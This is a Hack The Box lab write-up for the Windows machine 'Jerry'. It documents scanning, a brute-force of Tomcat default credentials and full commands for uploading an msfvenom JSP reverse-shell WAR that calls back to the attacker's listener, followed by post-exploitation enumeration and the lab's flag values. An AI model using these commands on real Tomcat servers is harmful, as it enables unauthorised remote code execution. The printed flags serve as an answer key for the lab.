+++
title = "Jerry"
date = "2023-11-02"
description = "This is an easy Windows box."
[extra]
cover = "cover.png"
toc = true
+++

# Information

**Difficulty**: Easy

**OS**: Windows

**Release date**: 2018-06-30

**Created by**: [mrh4sh](https://app.hackthebox.com/users/2570)

# Setup

I'll attack this box from a Kali Linux VM as the `root` user — not a great
practice security-wise, but it's a VM so it's alright. This way I won't have to
prefix some commands with `sudo`, which gets cumbersome in the long run.

I like to maintain consistency in my workflow for every box, so before starting
with the actual pentest, I'll prepare a few things:

1. I'll create a directory that will contain every file related to this box.
   I'll call it `workspace`, and it will be located at the root of my filesystem
   `/`.

1. I'll create a `server` directory in `/workspace`. Then, I'll use
   `httpsimpleserver` to create an HTTP server on port `80` and
   `impacket-smbserver` to create an SMB share named `server`. This will make
   files in this folder available over the Internet, which will be especially
   useful for transferring files to the target machine if need be!

1. I'll place all my tools and binaries into the `/workspace/server` directory.
   This will come in handy once we get a foothold, for privilege escalation and
   for pivoting inside the internal network.

I'll also strive to minimize the use of Metasploit, because it hides the
complexity of some exploits, and prefer a more manual approach when it's not too
much hassle. This way, I'll have a better understanding of the exploits I'm
running, and I'll have more control over what's happening on the machine.

Throughout this write-up, my machine's IP address will be `10.10.14.4`. The
commands ran on my machine will be prefixed with `❯` for clarity, and if I ever
need to transfer files or binaries to the target machine, I'll always place them
in the `/tmp` or `C:\tmp` folder to clean up more easily later on.

Now we should be ready to go!

# Host `10.10.10.95`

## Scanning

### Ports

As usual, let's start by initiating a port scan on Jerry using a TCP SYN `nmap`
scan to assess its attack surface.

```sh
❯ nmap -sS "10.10.10.95" -p-
```

```
<SNIP>
PORT     STATE SERVICE
8080/tcp open  http-proxy
<SNIP>
```

Let's also check the 500 most common UDP ports.

```sh
❯ nmap -sU "10.10.10.95" --top-ports "500"
```

```
<SNIP>
```

### Fingerprinting

Following the ports scans, let's gather more data about the service associated
with the open TCP port we found.

```sh
❯ nmap -sS "10.10.10.95" -p "8080" -sV
```

```
<SNIP>
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
<SNIP>
```

### Scripts

Let's run `nmap`'s default scripts on the TCP service to see if they can find
additional information.

```sh
❯ nmap -sS "10.10.10.95" -p "8080" -sC
```

```
<SNIP>
PORT     STATE SERVICE
8080/tcp open  http-proxy
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
<SNIP>
```

The `http-title` script detected that the website's homepage title is 'Apache
Tomcat/7.0.88', so we can assume that it's using Apache Tomcat version `7.0.88`.

## Services enumeration

### Apache Tomcat

#### Fingerprinting

Let's use `whatweb` to fingerprint Apache's homepage.

```sh
❯ whatweb -a3 "http://10.10.10.95:8080/" -v
```

```
WhatWeb report for http://10.10.10.95:8080/
Status    : 200 OK
Title     : Apache Tomcat/7.0.88
IP        : 10.10.10.95
Country   : RESERVED, ZZ

Summary   : Apache, HTML5, HTTPServer[Apache-Coyote/1.1]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : Apache-Coyote/1.1 (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Server: Apache-Coyote/1.1
        Content-Type: text/html;charset=ISO-8859-1
        Transfer-Encoding: chunked
        Date: Sat, 03 Feb 2024 21:56:53 GMT
        Connection: close
```

#### Exploration

Let's browse to `http://10.10.10.95:8080/`.

![Apache Tomcat homepage](apache-tomcat-homepage.png)

This is the standard homepage for Apache Tomcat.

A common way to get RCE with this application is by uploading a custom WAR file.
However, to access this functionality, we need to be authenticated.

#### Default credentials

If we search online for Apache Tomcat's default credentials, we find a
[wordlist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt)
from [SecLists](https://github.com/danielmiessler/SecLists).

I launched a Sniper attack on Burp Suite to test these credentials. Here's the result:

![Burp Suite default credentials attack](burp-default-credentials-attack.png)

The payload `dG9tY2F0OnMzY3JldA==` is valid, which corresponds to `tomcat:s3cret`.

#### Exploration

Let's resume our exploration of the website by authenticating to the 'Manager
App'.

![Apache Tomcat app manager](apache-tomcat-app-manager.png)

Now we have access to the WAR file upload functionality!

## Foothold (File upload)

As I said [previously](#exploration), a common way to get RCE with Apache Tomcat
is by uploading a custom WAR file. It requires to be authenticated, but we
[just discovered](#default-credentials) that default credentials were used.

### Preparation

The Metasploit module `exploit/multi/http/tomcat_mgr_upload` can be used to
exploit this vulnerability, but it's easy to do manually.

The goal is to obtain a reverse shell.

First, I'll setup a listener to receive the shell.

```sh
❯ rlwrap nc -lvnp "9001"
```

Then, I'll use `msfvenom` to generate a `java/jsp_shell_reverse_tcp` payload.

```sh
❯ msfvenom -p "java/jsp_shell_reverse_tcp" LHOST="10.10.14.4" LPORT="9001" -f "war" -o "/workspace/revshell.war"
```

### Exploitation

Now, it's time to upload our WAR file. However, to do so, we need a `CSRF_NONCE`
and a `JSSESSID` token.

```sh
❯ RESPONSE=$(curl -s -i -H "Authorization: Basic dG9tY2F0OnMzY3JldA==" "http://10.10.10.95:8080/manager/html"); \
    CSRF_NONCE=$(echo "$RESPONSE" | grep -oP '<form class="inline" method="POST" action="/manager/html/stop;jsessionid=[^?]+?\?path=/&amp;org.apache.catalina.filters.CSRF_NONCE=\K[^"]+'); \
    JSSESSID=$(echo "$RESPONSE" | grep -oP "Set-Cookie: JSESSIONID=\K[^;]+")
```

With these values, we can upload our WAR file.

```sh
❯ curl -s -o "/dev/null" -H "Authorization: Basic dG9tY2F0OnMzY3JldA==" "http://10.10.10.95:8080/manager/html/upload;jsessionid=$JSSESSID?org.apache.catalina.filters.CSRF_NONCE=$CSRF_NONCE" -X "POST" -F "deployWar=@/workspace/revshell.war"
```

Finally, let's trigger our `revshell.war` file!

```sh
❯ curl -s -o "/dev/null" "http://10.10.10.95:8080/revshell/"
```

And if we check our listener:

```
<SNIP>
C:\apache-tomcat-7.0.88>
```

It caught the reverse shell!

I'll transform it into a Powershell one.

## Getting a lay of the land

If we run `whoami`, we see that we got a foothold as `NT AUTHORITY\SYSTEM`.

I could just retrieve the flags and call it a day, but for good measure I'll
still enumerate basic information.

### Architecture

What is Jerry's architecture?

```ps1
PS C:\apache-tomcat-7.0.88> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" | Select-Object -ExpandProperty "PROCESSOR_ARCHITECTURE"
```

```
AMD64
```

It's using AMD64. Let's keep that in mind to select the appropriate binaries.

### Version

Let's gather some information about the Windows version of Jerry.

```ps1
PS C:\apache-tomcat-7.0.88> Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | Format-List -Property "ProductName", "CurrentBuildNumber"
```

```
ProductName        : Windows Server 2012 R2 Standard
CurrentBuildNumber : 9600
```

In fact, it's Windows Server 2012 R2 Standard build `9600`.

### Hotfixes

Let's retrieve the list of installed hotfixes.

```ps1
PS C:\apache-tomcat-7.0.88> Get-HotFix | Select-Object -ExpandProperty "HotFixID"
```

```
KB2868626
KB2883200
KB2887595
KB2894856
KB2903939
KB2911106
KB2919355
KB2919394
KB2928680
KB2938066
KB2954879
KB2967917
KB2977765
KB2978041
KB2978126
KB2989930
KB3000850
KB3003057
KB3004365
KB3004545
KB3012235
KB3012702
KB3013172
KB3013531
KB3013538
KB3013769
KB3013791
KB3013816
KB3014442
KB3015696
KB3018133
KB3019978
KB3021910
KB3023222
KB3023266
KB3024751
KB3024755
KB3029603
KB3030947
KB3032663
KB3033446
KB3035126
KB3036612
KB3037579
KB3037924
KB3038002
KB3042085
KB3044374
KB3044673
KB3045634
KB3045685
KB3045717
KB3045719
KB3045755
KB3045999
KB3046017
KB3046737
KB3054169
KB3054203
KB3054256
KB3054464
KB3055323
KB3055343
KB3055642
KB3059317
KB3060681
KB3060793
KB3061512
KB3063843
KB3071756
KB3074228
KB3074548
KB3076949
KB3077715
KB3078405
KB3078676
KB3080149
KB3082089
KB3084135
KB3084905
KB3086255
KB3087041
KB3087137
KB3091297
KB3094486
KB3095701
KB3097997
KB3098779
KB3099834
KB3100473
KB3102429
KB3103616
KB3103696
KB3103709
KB3109103
KB3109560
KB3109976
KB3110329
KB3115224
KB3121261
KB3121461
KB3123245
KB3126434
KB3126587
KB3133043
KB3133690
KB3134179
KB3134815
KB3137728
KB3138378
KB3138602
KB3138910
KB3138962
KB3139164
KB3139398
KB3139914
KB3140219
KB3140234
KB3145384
KB3145432
KB3146604
KB3146723
KB3146751
KB3147071
KB3155784
KB3156059
KB3159398
KB3161949
KB3162343
KB3172614
KB3172729
KB3173424
KB3175024
KB3178539
KB3179574
KB3185319
KB4033369
KB4033428
KB4054854
KB4096417
KB4287903
KB4284815
```

There's a lot of them.

### Users

Let's enumerate all users using `PowerView`.

```ps1
PS C:\apache-tomcat-7.0.88> Get-NetLocalGroupMember -GroupName "Users" | Where-Object { $_.MemberName -notmatch "NT AUTHORITY" } | Select-Object "MemberName", "SID" | Format-Table -AutoSize
```

There's no user.

What about the administrators?

```ps1
PS C:\apache-tomcat-7.0.88> Get-NetLocalGroupMember -GroupName "Administrators" | Where-Object { $_.MemberName -notmatch "NT AUTHORITY" } | Select-Object "MemberName", "SID" | Format-Table -AutoSize
```

```
MemberName          SID                                       
----------          ---                                       
JERRY\Administrator S-1-5-21-2323042369-1334567395-6350930-50
```

There's only the built-in `Administrator`.

### Groups

Let's enumerate all groups, once again using `PowerView`.

```ps1
PS C:\apache-tomcat-7.0.88> Get-NetLocalGroup | Select-Object "GroupName", "Comment" | Format-Table -AutoSize
```

```
GroupName                           Comment
---------                           -------
Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.
Administrators                      Administrators have complete and unrestricted access to the computer/domain
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the enterprise
Cryptographic Operators             Members are authorized to perform cryptographic operations.
Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this machine.
Event Log Readers                   Members of this group can read event logs from local machine
Guests                              Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of Hyper-V.
IIS_IUSRS                           Built-in group used by Internet Information Services.
Network Configuration Operators     Members in this group can have some administrative privileges to manage configuration of networking features
Performance Log Users               Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
Performance Monitor Users           Members of this group can access performance counter data locally and remotely
Power Users                         Power Users are included for backwards compatibility and possess limited administrative powers
Print Operators                     Members can administer printers installed on domain controllers
RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
RDS Management Servers              Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
Remote Desktop Users                Members in this group are granted the right to logon remotely
Remote Management Users             Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
Replicator                          Supports file replication in a domain      
Users                               Users are prevented from making accidental or intentional system-wide changes and can run most applications
WinRMRemoteWMIUsers__               Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
```

### NICs

Let's gather the list of connected NICs.

```ps1
PS C:\apache-tomcat-7.0.88> ipconfig /all
```

```
Windows IP Configuration

   Host Name . . . . . . . . . . . . : JERRY
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : htb
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-02-18
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::21f(Preferred) 
   Lease Obtained. . . . . . . . . . : Saturday, February 3, 2024 11:49:10 PM
   Lease Expires . . . . . . . . . . : Sunday, February 4, 2024 1:19:09 AM
   IPv6 Address. . . . . . . . . . . : dead:beef::7184:7057:9aab:aaf0(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::7184:7057:9aab:aaf0%11(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.95(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:1014%11
                                       10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 167792726
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2D-50-6D-2D-00-50-56-B9-02-18
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb

Tunnel adapter isatap.{E6565A26-EF2E-43A5-A579-B0F25E7B1DC8}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

There's an Ethernet interface and an ISATAP interface.

## System enumeration

### Flags

If we check `Administrator`'s Desktop folder, we find a `flags` folder
containing a `2 for the price of 1.txt` file, which contains both the user and
root flags.

```ps1
PS C:\apache-tomcat-7.0.88> Get-Content "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

```
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

# Afterwords

![Success](success.png)

That's it for this box! 🎉

I rated both the user and root flags as 'Piece of cake' to obtain. The foothold
was extremely easy to identify and to exploit, as obtaining RCE with Apache
Tomcat through WAR file upload is a classic, and it even granted us access to
the system as `NT AUTHORITY\SYSTEM`, so there was no need to escalate privileges
afterwards.

Thanks for reading!
